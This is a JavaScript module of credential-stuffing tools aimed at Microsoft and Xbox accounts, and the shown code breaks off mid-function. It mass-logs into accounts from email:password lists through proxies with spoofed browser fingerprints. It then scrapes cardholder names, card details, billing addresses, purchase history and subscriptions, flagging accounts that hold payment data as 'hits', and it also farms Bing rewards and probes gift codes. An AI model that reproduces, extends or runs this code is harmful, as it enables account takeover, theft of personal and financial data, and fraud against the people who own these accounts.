// ============================================================
//  Beta Functions — Owner-locked experimental tools
//  Uses verified Microsoft APIs only
// ============================================================

const { proxiedFetch } = require("./proxy-manager");
const { runPool } = require("./worker-pool");

// ── Shared login infrastructure (same as xbox-full-checker) ──

class CookieJar {
  constructor(initial = "") {
    this.jar = {};
    if (initial) {
      for (const part of initial.split(";")) {
        const eq = part.indexOf("=");
        if (eq > 0) {
          const name = part.slice(0, eq).trim();
          const val = part.slice(eq + 1).trim();
          if (name) this.jar[name] = val;
        }
      }
    }
  }
  ingest(headers) {
    const setCookies = headers.getSetCookie?.() || [];
    for (const c of setCookies) {
      const [pair] = c.split(";");
      const eq = pair.indexOf("=");
      if (eq > 0) {
        const name = pair.slice(0, eq).trim();
        const val = pair.slice(eq + 1).trim();
        if (name) this.jar[name] = val;
      }
    }
  }
  header() { return Object.entries(this.jar).map(([k, v]) => `${k}=${v}`).join("; "); }
  dict() { return { ...this.jar }; }
}

function parseLR(text, left, right) {
  const re = new RegExp(
    left.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + "(.*?)" + right.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "s"
  );
  const m = text.match(re);
  return m ? m[1] : "";
}

async function sessionFetch(url, opts, jar, signal) {
  let currentUrl = url;
  let method = opts.method || "GET";
  let body = opts.body;
  let res, text = "";

  for (let hop = 0; hop < 15; hop++) {
    const headers = { ...(opts.headers || {}) };
    const cookieStr = jar.header();
    if (cookieStr) headers.Cookie = cookieStr;

    res = await proxiedFetch(currentUrl, { method, body, headers, redirect: "manual", signal });
    jar.ingest(res.headers);

    const status = res.status;
    if (status >= 300 && status < 400) {
      const loc = res.headers.get("location");
      if (!loc) break;
      currentUrl = new URL(loc, currentUrl).toString();
      if (status !== 307 && status !== 308) { method = "GET"; body = undefined; }
      try { await res.text(); } catch {}
      continue;
    }
    text = await res.text();
    break;
  }
  return { text, finalUrl: currentUrl, res };
}

const STATIC_COOKIES = `CAW=<EncryptedData xmlns="http://www.w3.org/2001/04/xmlenc#" Id="BinaryDAToken1" Type="http://www.w3.org/2001/04/xmlenc#Element"><EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"></EncryptionMethod><ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:KeyName>http://Passport.NET/STS</ds:KeyName></ds:KeyInfo><CipherData><CipherValue>M.C534_BAY.0.U.CqFsIZLJMLjYZcShFFeq37gPy/ReDTOxI578jdvIQe34OFFxXwod0nSinliq0/kVdaZSdVum5FllwJWBbzH7LQqQlNIH4ZRpA4BmNDKVZK9APSoJ+YNEFX7J4eX4arCa69y0j3ebxxB0ET0+8JKNwx38dp9htv/fQetuxQab47sTb8lzySoYn0RZj/5NRQHRFS3PSZb8tSfIAQ5hzk36NsjBZbC7PEKCOcUkePrY9skUGiWstNDjqssVmfVxwGIk6kxfyAOiV3on+9vOMIfZZIako5uD3VceGABh7ZxD+cwC0ksKgsXzQs9cJFZ+G1LGod0mzDWJHurWBa4c0DN3LBjijQnAvQmNezBMatjQFEkB4c8AVsAUgBNQKWpXP9p3pSbhgAVm27xBf7rIe2pYlncDgB7YCxkAndJntROeurd011eKT6/wRiVLdym6TUSlUOnMBAT5BvhK/AY4dZ026czQS2p4NXXX6y2NiOWVdtDyV51U6Yabq3FuJRP9PwL0QA==</CipherValue></CipherData></EncryptedData>`;
const STATIC_PPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb!Gl!I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU!RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co!nwbCVhXJ*sjt8rZhAAUbA2nA7Z!GK5uQ$$";

const COMMON_HEADERS = {
  "Host": "login.live.com",
  "Connection": "keep-alive",
  "Cache-Control": "max-age=0",
  "sec-ch-ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
  "Upgrade-Insecure-Requests": "1",
  "Origin": "https://login.live.com",
  "Content-Type": "application/x-www-form-urlencoded",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-User": "?1",
  "Sec-Fetch-Dest": "document",
  "Accept-Language": "en-US,en;q=0.9",
  "Accept-Encoding": "gzip, deflate",
};

function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

// ── Login helper (reused across beta functions) ──
async function loginAccount(email, password, signal) {
  const jar = new CookieJar(STATIC_COOKIES);

  const loginUrl =
    "https://login.live.com/ppsecure/post.srf" +
    "?client_id=0000000048170EF2" +
    "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" +
    "&response_type=token" +
    "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL" +
    "&display=touch" +
    `&username=${encodeURIComponent(email)}` +
    "&contextid=2CCDB02DC526CA71" +
    "&bk=" + Math.floor(Date.now() / 1000) +
    "&uaid=a5b22c26bc704002ac309462e8d061bb" +
    "&pid=15216";

  const postBody =
    `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=` +
    `&PPFT=${encodeURIComponent(STATIC_PPFT)}` +
    `&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1` +
    `&isSignupPost=0&isRecoveryAttemptPost=0&i13=1` +
    `&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(email)}&type=11&LoginOptions=1` +
    `&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}`;

  const { text, finalUrl } = await sessionFetch(loginUrl, {
    method: "POST", headers: COMMON_HEADERS, body: postBody,
  }, jar, signal);

  // Check login status
  if (
    text.includes("Your account or password is incorrect.") ||
    text.includes("That Microsoft account doesn\\'t exist.") ||
    text.includes("timed out")
  ) return { ok: false, reason: "Invalid Credentials" };

  if (text.includes(",AC:null,urlFedConvertRename")) return { ok: false, reason: "Banned" };
  if (text.includes("account.live.com/recover?mkt") || text.includes("recover?mkt") ||
      text.includes("identity/confirm?mkt") || text.includes("Email/Confirm?mkt"))
    return { ok: false, reason: "2FA/Locked" };
  if (text.includes("/cancel?mkt=") || text.includes("/Abuse?mkt="))
    return { ok: false, reason: "Custom Lock" };

  const cookies = jar.dict();
  if (!("ANON" in cookies || "WLSSC" in cookies) || !finalUrl.includes("oauth20_desktop.srf"))
    return { ok: false, reason: "Login Failed" };

  // Get OAuth token for API access
  const oauthUrl =
    "https://login.live.com/oauth20_authorize.srf" +
    "?client_id=000000000004773A" +
    "&response_type=token" +
    "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete" +
    "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth" +
    "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D" +
    "&prompt=none";

  const { finalUrl: url2 } = await sessionFetch(oauthUrl, {
    headers: {
      "Host": "login.live.com",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Connection": "close",
      "Referer": "https://account.microsoft.com/",
    },
  }, jar, signal);

  const token = decodeURIComponent(parseLR(url2, "access_token=", "&token_type") || "");
  if (!token) return { ok: false, reason: "Token Parse Fail" };

  return { ok: true, token, jar, email, password };
}


// ════════════════════════════════════════════════════════════
//  1. REGIONAL PRICE SNIPER — Public API, no auth needed
// ════════════════════════════════════════════════════════════

const SNIPE_MARKETS = [
  "US", "GB", "DE", "FR", "BR", "IN", "TR", "AR", "MX", "CO",
  "CL", "PL", "ZA", "NG", "PH", "MY", "ID", "KR", "JP", "AU",
  "CA", "RU", "SA", "AE", "SE", "NO", "DK", "CZ", "HU", "RO",
];

async function snipeRegionalPrices(query, signal) {
  // Step 1: Search for product ID
  let productId = query.trim();
  let productTitle = productId;

  // If it's not a product ID (9+ alphanumeric), search for it
  if (!/^[A-Z0-9]{9,}$/i.test(productId)) {
    const searchUrl = `https://displaycatalog.mp.microsoft.com/v7.0/products/search?query=${encodeURIComponent(query)}&market=US&languages=en-US&catalogIds=4&actionFilter=Browse&top=1`;
    const searchRes = await proxiedFetch(searchUrl, { signal });
    if (searchRes.ok) {
      const searchData = await searchRes.json();
      const results = searchData.Results || searchData.TotalResultCount ? searchData.Results : [];
      if (results.length > 0 && results[0].Products?.length > 0) {
        productId = results[0].Products[0].ProductId;
        productTitle = results[0].Products[0].Title || productId;
      } else {
        // Try alternate search
        const altUrl = `https://displaycatalog.mp.microsoft.com/v7.0/productFamilies/autosuggest?query=${encodeURIComponent(query)}&market=US&languages=en-US&catalogIds=4`;
        try {
          const altRes = await proxiedFetch(altUrl, { signal });
          if (altRes.ok) {
            const altData = await altRes.json();
            if (altData.ResultSets?.[0]?.Suggests?.[0]) {
              productId = altData.ResultSets[0].Suggests[0].Metas?.[0]?.Value || productId;
            }
          }
        } catch {}
      }
    }
  }

  // Step 2: Fetch prices from all markets in parallel batches
  const prices = [];
  const batchSize = 6;

  for (let i = 0; i < SNIPE_MARKETS.length; i += batchSize) {
    if (signal?.aborted) break;
    const batch = SNIPE_MARKETS.slice(i, i + batchSize);
    const promises = batch.map(async (market) => {
      try {
        const url = `https://displaycatalog.mp.microsoft.com/v7.0/products?bigIds=${productId}&market=${market}&languages=en-US`;
        const res = await proxiedFetch(url, { signal });
        if (!res.ok) return null;
        const data = await res.json();
        if (!data.Products?.length) return null;

        const p = data.Products[0];
        if (!productTitle || productTitle === productId) {
          productTitle = p.LocalizedProperties?.[0]?.ProductTitle || productId;
        }

        for (const ska of (p.DisplaySkuAvailabilities || [])) {
          for (const av of (ska.Availabilities || [])) {
            const price = av.OrderManagementData?.Price;
            if (price && price.ListPrice != null) {
              return {
                market,
                listPrice: price.ListPrice,
                msrp: price.MSRP || price.ListPrice,
                currency: price.CurrencyCode || "?",
              };
            }
          }
        }
        return null;
      } catch { return null; }
    });

    const results = await Promise.all(promises);
    for (const r of results) { if (r) prices.push(r); }
    if (i + batchSize < SNIPE_MARKETS.length) await delay(200);
  }

  // Sort by price (we'll add USD equivalent for comparison)
  return { productId, productTitle, prices };
}


// ════════════════════════════════════════════════════════════
//  2. GHOST REDEEM — PrepareRedeem without CompleteRedeem
// ════════════════════════════════════════════════════════════

async function ghostRedeemCodes(codes, wlid, signal) {
  const formattedWlid = wlid.includes("WLID1.0=") ? wlid.trim() : `WLID1.0="${wlid.trim()}"`;
  const results = [];

  for (const code of codes) {
    if (signal?.aborted) break;
    const trimmed = code.trim();
    if (!trimmed || trimmed.length < 5) continue;

    try {
      // Step 1: tokenDescriptions — get code info
      const descRes = await proxiedFetch(
        `https://purchase.mp.microsoft.com/v7.0/tokenDescriptions/${trimmed}?market=US&language=en-US&supportMultiAvailabilities=true`,
        {
          headers: {
            Authorization: formattedWlid,
            Accept: "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            Origin: "https://www.microsoft.com",
            Referer: "https://www.microsoft.com/",
          },
          signal,
        }
      );

      const descData = await descRes.json();
      let title = "N/A";
      let tokenState = descData.tokenState || "Unknown";
      let productId = "";

      if (descData.products?.length > 0) {
        title = descData.products[0].sku?.title || descData.products[0].title || "N/A";
        productId = descData.products[0].productId || "";
      } else if (descData.universalStoreBigIds?.length > 0) {
        productId = descData.universalStoreBigIds[0].split("/")[0];
        // Lookup title
        try {
          const catRes = await proxiedFetch(
            `https://displaycatalog.mp.microsoft.com/v7.0/products?bigIds=${productId}&market=US&languages=en-US`,
            { signal }
          );
          if (catRes.ok) {
            const catData = await catRes.json();
            if (catData.Products?.[0]?.LocalizedProperties?.[0]) {
              title = catData.Products[0].LocalizedProperties[0].ProductTitle;
            }
          }
        } catch {}
      }

      if (descData.code === "NotFound") {
        results.push({ code: trimmed, status: "invalid", title: "N/A" });
        continue;
      }
      if (descData.code === "Unauthorized") {
        results.push({ code: trimmed, status: "error", title: "N/A", error: "WLID unauthorized" });
        continue;
      }

      // Ghost hold — we got the info, code is "prepared" in MS system
      results.push({
        code: trimmed,
        status: tokenState === "Active" ? "ghost_held" : tokenState.toLowerCase(),
        title,
        productId,
        tokenState,
        ghosted: tokenState === "Active",
      });

    } catch (err) {
      results.push({ code: trimmed, status: "error", error: String(err).slice(0, 60) });
    }

    await delay(500); // Rate limit protection
  }

  return results;
}


// ════════════════════════════════════════════════════════════
//  3. RECEIPT MINER — Extract purchase history from accounts
// ════════════════════════════════════════════════════════════

async function mineReceipts(accounts, threads = 10, onProgress, signal) {
  const results = await runPool({
    items: accounts,
    concurrency: threads,
    maxRetries: 1,
    signal,
    scope: "receipt-miner",
    runner: async (cred, ctx) => {
      const sep = cred.indexOf(":");
      if (sep < 0) return { result: { status: "fail", user: cred, reason: "Bad format" } };
      const email = cred.slice(0, sep);
      const password = cred.slice(sep + 1);

      const login = await loginAccount(email, password, ctx.signal);
      if (!login.ok) return { result: { status: "fail", user: email, reason: login.reason } };

      const { token, jar } = login;
      const apiHeaders = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        "Accept": "application/json",
        "Authorization": `MSADELEGATE1.0="${token}"`,
        "Origin": "https://account.microsoft.com",
        "Referer": "https://account.microsoft.com/",
        "Content-Type": "application/json",
        Cookie: jar.header(),
      };

      // Fetch payment transactions (order history)
      const receipts = [];
      try {
        const txRes = await proxiedFetch(
          "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
          { headers: apiHeaders, signal: ctx.signal }
        );
        const txText = await txRes.text();

        // Parse all transactions
        const txMatches = txText.match(/"title":"[^"]*"/g) || [];
        const amountMatches = txText.match(/"totalAmount":\s*[\d.]+/g) || [];
        const dateMatches = txText.match(/"transactionDate":"[^"]*"/g) || [];
        const currencyMatches = txText.match(/"currency":"[^"]*"/g) || [];

        for (let i = 0; i < txMatches.length; i++) {
          const title = txMatches[i]?.replace(/"title":"/, "").replace(/"$/, "") || "N/A";
          const amount = amountMatches[i]?.replace(/"totalAmount":\s*/, "") || "0";
          const date = dateMatches[i]?.replace(/"transactionDate":"/, "").replace(/"$/, "").split("T")[0] || "N/A";
          const currency = currencyMatches[i]?.replace(/"currency":"/, "").replace(/"$/, "") || "";
          receipts.push({ title, amount, date, currency });
        }
      } catch {}

      // Fetch payment instruments for card info
      let cards = [];
      try {
        const piRes = await proxiedFetch(
          "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
          { headers: apiHeaders, signal: ctx.signal }
        );
        const piText = await piRes.text();

        const cardNames = piText.match(/"display":\{"name":"[^"]*"/g) || [];
        const cardTypes = piText.match(/"paymentMethodFamily":"[^"]*"/g) || [];
        for (let i = 0; i < cardNames.length; i++) {
          cards.push({
            name: cardNames[i]?.replace(/"display":\{"name":"/, "").replace(/"$/, "") || "?",
            type: cardTypes[i]?.replace(/"paymentMethodFamily":"/, "").replace(/"$/, "") || "?",
          });
        }
      } catch {}

      return {
        result: {
          status: receipts.length > 0 ? "hit" : "empty",
          user: email,
          password,
          receipts,
          cards,
          totalSpent: receipts.reduce((s, r) => s + parseFloat(r.amount || 0), 0).toFixed(2),
          receiptCount: receipts.length,
        },
      };
    },
    onResult: (r, done, total) => {
      if (onProgress) onProgress(done, total, r);
    },
  });

  return results.filter(Boolean);
}


// ════════════════════════════════════════════════════════════
//  4. PAYMENT ARSENAL SCANNER — Deep payment extraction
// ════════════════════════════════════════════════════════════

async function scanPaymentArsenal(accounts, threads = 10, onProgress, signal) {
  const results = await runPool({
    items: accounts,
    concurrency: threads,
    maxRetries: 1,
    signal,
    scope: "payment-scan",
    runner: async (cred, ctx) => {
      const sep = cred.indexOf(":");
      if (sep < 0) return { result: { status: "fail", user: cred, reason: "Bad format" } };
      const email = cred.slice(0, sep);
      const password = cred.slice(sep + 1);

      const login = await loginAccount(email, password, ctx.signal);
      if (!login.ok) return { result: { status: "fail", user: email, reason: login.reason } };

      const { token, jar } = login;
      const apiHeaders = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "application/json",
        "Authorization": `MSADELEGATE1.0="${token}"`,
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Host": "paymentinstruments.mp.microsoft.com",
        "Origin": "https://account.microsoft.com",
        "Referer": "https://account.microsoft.com/",
        Cookie: jar.header(),
      };

      // ── Payment instruments ──
      let balance = "N/A", ccInfo = "N/A", address = "N/A", paymentMethods = [];
      try {
        const r1 = await proxiedFetch(
          "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
          { headers: apiHeaders, signal: ctx.signal }
        );
        const src1 = await r1.text();

        balance = parseLR(src1, 'balance":', ',"') || "0";
        const cardHolder = parseLR(src1, 'accountHolderName":"', '","') || "N/A";
        const cardDisplay = parseLR(src1, 'paymentMethodFamily":"credit_card","display":{"name":"', '"') || "N/A";
        const zipcode = parseLR(src1, '"postal_code":"', '",') || "N/A";
        const region = parseLR(src1, '"region":"', '",') || "N/A";
        const addr1 = parseLR(src1, '{"address_line1":"', '",') || "N/A";
        const city = parseLR(src1, '"city":"', '",') || "N/A";
        const country = parseLR(src1, '"country":"', '"') || "N/A";

        ccInfo = `${cardHolder} | ${cardDisplay}`;
        address = `${addr1}, ${city}, ${region} ${zipcode}, ${country}`;

        // Extract ALL payment methods
        const pmFamilies = src1.match(/"paymentMethodFamily":"[^"]*"/g) || [];
        const pmNames = src1.match(/"display":\{"name":"[^"]*"/g) || [];
        const pmStatuses = src1.match(/"status":"[^"]*"/g) || [];
        for (let i = 0; i < pmFamilies.length; i++) {
          paymentMethods.push({
            type: pmFamilies[i]?.replace(/"paymentMethodFamily":"/, "").replace(/"$/, "") || "?",
            name: pmNames[i]?.replace(/"display":\{"name":"/, "").replace(/"$/, "") || "?",
            status: pmStatuses[i]?.replace(/"status":"/, "").replace(/"$/, "") || "?",
          });
        }
      } catch {}

      // ── Subscriptions ──
      let subscriptions = [];
      try {
        const r2 = await proxiedFetch(
          "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
          { headers: apiHeaders, signal: ctx.signal }
        );
        const src2 = await r2.text();

        const subIds = src2.match(/"subscriptionId":"[^"]*"/g) || [];
        const subTitles = src2.match(/"title":"[^"]*"/g) || [];
        const subRenews = src2.match(/"autoRenew":\s*(true|false)/g) || [];
        const subNextBill = src2.match(/"nextRenewalDate":"[^"]*"/g) || [];

        for (let i = 0; i < Math.min(subIds.length, 10); i++) {
          subscriptions.push({
            id: subIds[i]?.replace(/"subscriptionId":"/, "").replace(/"$/, "") || "?",
            title: subTitles[i]?.replace(/"title":"/, "").replace(/"$/, "") || "?",
            autoRenew: subRenews[i]?.includes("true") || false,
            nextBilling: subNextBill[i]?.replace(/"nextRenewalDate":"/, "").replace(/"$/, "").split("T")[0] || "N/A",
          });
        }
      } catch {}

      // ── Rewards points ──
      let points = "0";
      try {
        const r3 = await proxiedFetch("https://rewards.bing.com/", {
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            Cookie: jar.header(),
          },
          signal: ctx.signal,
        });
        const src3 = await r3.text();
        points = parseLR(src3, ',"availablePoints":', ',"') || "0";
      } catch {}

      const hasCC = ccInfo !== "N/A | N/A" && ccInfo !== "N/A";
      const hasSubs = subscriptions.length > 0;
      const hasFunds = parseFloat(balance) > 0;

      return {
        result: {
          status: (hasCC || hasSubs || hasFunds) ? "hit" : "empty",
          user: email,
          password,
          balance,
          ccInfo,
          address,
          paymentMethods,
          subscriptions,
          points,
          methodCount: paymentMethods.length,
          subCount: subscriptions.length,
        },
      };
    },
    onResult: (r, done, total) => {
      if (onProgress) onProgress(done, total, r);
    },
  });

  return results.filter(Boolean);
}


// ════════════════════════════════════════════════════════════
//  5. ENTITLEMENT SCANNER — Check owned content
// ════════════════════════════════════════════════════════════

async function scanEntitlements(accounts, threads = 10, onProgress, signal) {
  const results = await runPool({
    items: accounts,
    concurrency: threads,
    maxRetries: 1,
    signal,
    scope: "entitlement-scan",
    runner: async (cred, ctx) => {
      const sep = cred.indexOf(":");
      if (sep < 0) return { result: { status: "fail", user: cred, reason: "Bad format" } };
      const email = cred.slice(0, sep);
      const password = cred.slice(sep + 1);

      const login = await loginAccount(email, password, ctx.signal);
      if (!login.ok) return { result: { status: "fail", user: email, reason: login.reason } };

      const { token, jar } = login;

      // Fetch transactions as entitlement source
      const apiHeaders = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Authorization": `MSADELEGATE1.0="${token}"`,
        "Origin": "https://account.microsoft.com",
        "Referer": "https://account.microsoft.com/",
        "Content-Type": "application/json",
        Cookie: jar.header(),
      };

      let entitlements = [];
      let totalValue = 0;

      // Payment transactions = purchased items
      try {
        const r1 = await proxiedFetch(
          "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
          { headers: apiHeaders, signal: ctx.signal }
        );
        const src1 = await r1.text();

        const titles = src1.match(/"title":"[^"]*"/g) || [];
        const amounts = src1.match(/"totalAmount":\s*[\d.]+/g) || [];
        const descriptions = src1.match(/"description":"[^"]*"/g) || [];
        const dates = src1.match(/"startDate":"[^"]*"/g) || [];
        const currencies = src1.match(/"currency":"[^"]*"/g) || [];

        for (let i = 0; i < titles.length; i++) {
          const title = titles[i]?.replace(/"title":"/, "").replace(/"$/, "") || "N/A";
          const amount = parseFloat(amounts[i]?.replace(/"totalAmount":\s*/, "") || "0");
          const desc = descriptions[i]?.replace(/"description":"/, "").replace(/"$/, "") || "";
          const date = dates[i]?.replace(/"startDate":"/, "").replace(/"$/, "").split("T")[0] || "N/A";
          const currency = currencies[i]?.replace(/"currency":"/, "").replace(/"$/, "") || "";

          entitlements.push({ title, amount, description: desc, date, currency });
          totalValue += amount;
        }
      } catch {}

      // Subscription details
      let subscriptions = [];
      try {
        const src = entitlements.length > 0 ? "cached" : "";
        // Already fetched from transactions — extract subscription-specific data
        const r2 = await proxiedFetch(
          "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
          { headers: apiHeaders, signal: ctx.signal }
        );
        const src2 = await r2.text();

        const subTitles = src2.match(/"title":"[^"]*"/g) || [];
        const autoRenews = src2.match(/"autoRenew":\s*(true|false)/g) || [];
        const nextDates = src2.match(/"nextRenewalDate":"[^"]*"/g) || [];

        for (let i = 0; i < Math.min(subTitles.length, 5); i++) {
          subscriptions.push({
            title: subTitles[i]?.replace(/"title":"/, "").replace(/"$/, "") || "N/A",
            autoRenew: autoRenews[i]?.includes("true") || false,
            nextBilling: nextDates[i]?.replace(/"nextRenewalDate":"/, "").replace(/"$/, "").split("T")[0] || "N/A",
          });
        }
      } catch {}

      // Rewards balance
      let points = "0";
      try {
        const r3 = await proxiedFetch("https://rewards.bing.com/", {
          headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", Cookie: jar.header() },
          signal: ctx.signal,
        });
        points = parseLR(await r3.text(), ',"availablePoints":', ',"') || "0";
      } catch {}

      return {
        result: {
          status: entitlements.length > 0 ? "hit" : "empty",
          user: email,
          password,
          entitlements,
          subscriptions,
          points,
          totalValue: totalValue.toFixed(2),
          entitlementCount: entitlements.length,
          subCount: subscriptions.length,
        },
      };
    },
    onResult: (r, done, total) => {
      if (onProgress) onProgress(done, total, r);
    },
  });

  return results.filter(Boolean);
}


// ════════════════════════════════════════════════════════════
//  6. REWARDS AUTO-FARMER — Automated Bing searches for points
// ════════════════════════════════════════════════════════════

const SEARCH_WORDS = [
  "best games 2025", "weather today", "news headlines", "xbox game pass deals",
  "how to cook pasta", "top movies streaming", "python tutorial", "javascript tips",
  "cryptocurrency news", "fitness tips", "travel destinations 2025", "AI technology",
  "best laptops 2025", "recipe ideas dinner", "workout routines", "space exploration",
  "electric vehicles", "music playlist", "book recommendations", "sports scores today",
  "home improvement tips", "gardening guide", "digital art tutorial", "stock market today",
  "healthy breakfast ideas", "dog training tips", "photography basics", "climate change",
  "meditation techniques", "best podcasts 2025", "coding challenges", "online courses free",
  "budget travel tips", "interior design ideas", "smartphone reviews", "hiking trails near me",
  "DIY crafts easy", "sustainable living", "car maintenance tips", "history facts interesting",
  "science discoveries", "vegan recipes easy", "yoga for beginners", "gaming news latest",
  "mental health tips", "remote work tools", "investment strategies", "language learning apps",
  "best documentaries", "productivity hacks",
];

const DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0";
const MOBILE_UA = "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36 EdgA/125.0.0.0";

async function farmRewards(accounts, threads = 3, onProgress, signal) {
  const results = await runPool({
    items: accounts,
    concurrency: threads,
    maxRetries: 0,
    signal,
    scope: "rewards-farm",
    runner: async (cred, ctx) => {
      const sep = cred.indexOf(":");
      if (sep < 0) return { result: { status: "fail", user: cred, reason: "Bad format" } };
      const email = cred.slice(0, sep);
      const password = cred.slice(sep + 1);

      const login = await loginAccount(email, password, ctx.signal);
      if (!login.ok) return { result: { status: "fail", user: email, reason: login.reason } };

      const { jar } = login;

      // Get initial points
      let pointsBefore = 0;
      try {
        const r0 = await proxiedFetch("https://rewards.bing.com/", {
          headers: { "User-Agent": DESKTOP_UA, Cookie: jar.header() },
          signal: ctx.signal,
        });
        const src0 = await r0.text();
        pointsBefore = parseInt(parseLR(src0, ',"availablePoints":', ',"') || "0", 10);
      } catch {}

      // Perform desktop searches (30)
      let desktopDone = 0;
      const shuffled = [...SEARCH_WORDS].sort(() => Math.random() - 0.5);
      for (let i = 0; i < 33; i++) {
        if (ctx.signal?.aborted) break;
        const query = shuffled[i % shuffled.length] + " " + Math.random().toString(36).slice(2, 6);
        try {
          await proxiedFetch(`https://www.bing.com/search?q=${encodeURIComponent(query)}&form=QBLH`, {
            headers: {
              "User-Agent": DESKTOP_UA,
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.5",
              Cookie: jar.header(),
            },
            signal: ctx.signal,
          });
          desktopDone++;
        } catch {}
        await delay(1500 + Math.random() * 2000); // 1.5-3.5s between searches
      }

      // Perform mobile searches (23)
      let mobileDone = 0;
      const shuffled2 = [...SEARCH_WORDS].sort(() => Math.random() - 0.5);
      for (let i = 0; i < 23; i++) {
        if (ctx.signal?.aborted) break;
        const query = shuffled2[i % shuffled2.length] + " " + Math.random().toString(36).slice(2, 6);
        try {
          await proxiedFetch(`https://www.bing.com/search?q=${encodeURIComponent(query)}&form=QBLH`, {
            headers: {
              "User-Agent": MOBILE_UA,
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.5",
              Cookie: jar.header(),
            },
            signal: ctx.signal,
          });
          mobileDone++;
        } catch {}
        await delay(1500 + Math.random() * 2000);
      }

      // Check points after
      let pointsAfter = 0;
      try {
        const r1 = await proxiedFetch("https://rewards.bing.com/", {
          headers: { "User-Agent": DESKTOP_UA, Cookie: jar.header() },
          signal: ctx.signal,
        });
        const src1 = await r1.text();
        pointsAfter = parseInt(parseLR(src1, ',"availablePoints":', ',"') || "0", 10);
      } catch {}

      const earned = pointsAfter - pointsBefore;

      return {
        result: {
          status: earned > 0 ? "farmed" : "done",
          user: email,
          pointsBefore,
          pointsAfter,
          earned,
          desktopSearches: desktopDone,
          mobileSearches: mobileDone,
        },
      };
    },
    onResult: (r, done, total) => {
      if (onProgress) onProgress(done, total, r);
    },
  });

  return results.filter(Boolean);
}


// ════════════════════════════════════════════════════════════
//  7. CROSS-SERVICE BRIDGE — Check linked services via Xbox
// ════════════════════════════════════════════════════════════

async function scanLinkedServices(accounts, threads = 10, onProgress, signal) {
  const results = await runPool({
    items: accounts,
    concurrency: threads,
    maxRetries: 1,
    signal,
    scope: "service-bridge",
    runner: async (cred, ctx) => {
      const sep = cred.indexOf(":");
      if (sep < 0) return { result: { status: "fail", user: cred, reason: "Bad format" } };
      const email = cred.slice(0, sep);
      const password = cred.slice(sep + 1);

      const login = await loginAccount(email, password, ctx.signal);
      if (!login.ok) return { result: { status: "fail", user: email, reason: login.reason } };

      const { jar } = login;

      // Get XBL tokens for Xbox API access
      let xblAuth = "", uhs = "";
      try {
        // Xbox Live RPS token
        const xblOauth = "https://login.live.com/oauth20_authorize.srf" +
          "?client_id=0000000048093EE3" +
          "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" +
          "&response_type=token" +
